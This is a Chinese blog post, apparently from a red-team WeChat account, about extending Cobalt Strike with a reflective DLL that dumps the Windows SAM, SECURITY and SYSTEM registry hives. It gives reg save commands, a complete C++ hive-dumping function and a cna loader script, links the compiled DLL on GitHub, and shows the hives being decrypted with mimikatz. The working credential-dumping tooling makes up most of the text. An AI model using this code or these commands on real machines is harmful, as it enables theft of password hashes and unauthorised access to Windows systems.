> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FziKWjUsoO99iwZarCIZPQ)

  继续使用我们的 Reflective DLL 功能来武装我们的 CobaltStrike。

一般来说抓取注册表的方法如下：  

```
reg save hklm\sam sam.hive
 reg save hklm\system system.hive
 reg save hklm\security security.hive
```

然后在使用 mimikatz 来解密注册表。我们先使用 C++ 来实现这样的一个过程：

```
void dump_reg()
{
    HKEY hKey = 0x0;

    DWORD file_exist;

    //dump sam
    LPCWSTR lpSubKey = L"SAM";
    LPCWSTR  lpFile = L"C:\\ProgramData\\sam.save"; 
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
    file_exist = RegSaveKeyExW(hKey, lpFile, 0x0, 2);

    //Check file exist
    if (file_exist == 183) {
        DeleteFileW(lpFile);
        RegSaveKeyW(hKey, lpFile, 0x0);
    }
    RegCloseKey(hKey);

    hKey = 0x0;
    //dump security
    lpSubKey = L"SECURITY";
    lpFile = L"C:\\ProgramData\\security.save";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
    file_exist = RegSaveKeyExW(hKey, lpFile, 0x0, 2);

    //Check file exist
    if (file_exist == 183) {
        DeleteFileW(lpFile);
        RegSaveKeyW(hKey, lpFile, 0x0);
    }
    RegCloseKey(hKey);

    hKey = 0x0;
    //dump system
    lpSubKey = L"SYSTEM";
    lpFile = L"C:\\ProgramData\\system.save";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
    file_exist = RegSaveKeyExW(hKey, lpFile, 0x0, 2);

    //Check file exist
    if (file_exist == 183) {
        DeleteFileW(lpFile);
        RegSaveKeyW(hKey, lpFile, 0x0);
    }
    RegCloseKey(hKey);

}
```

然后使用我们之前的方法，把它转换为反射型的 dll, 已上传至 github(x64):

https://github.com/lengjibo/RedTeamTools/tree/master/windows/samdump

 然后随便写个 cna 脚本来加载它：  

```
alias hello {
  bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
}
```

执行

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08X3gL3cGqK2C2kdGIpyR4WHahlEboQ62qJdBSajicsnnUJXUqRrdIFZ65bAJcwByokS8OmlGazWfhA/640?wx_fmt=png)

导出成功，C:\ProgramData

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08X3gL3cGqK2C2kdGIpyR4WHPAO0ZJy5aib5tWwj2y6m8JricQPSGO5Q4o4XGqZGTzMWFY23nKo1OTsQ/640?wx_fmt=png)

mimikatz 解密:

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08X3gL3cGqK2C2kdGIpyR4WH7dk5PwAZVm9zTk87Hsibkrb5YgQByNyrLc2dXp4fRbTsW6kXYD1LbMw/640?wx_fmt=png)

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)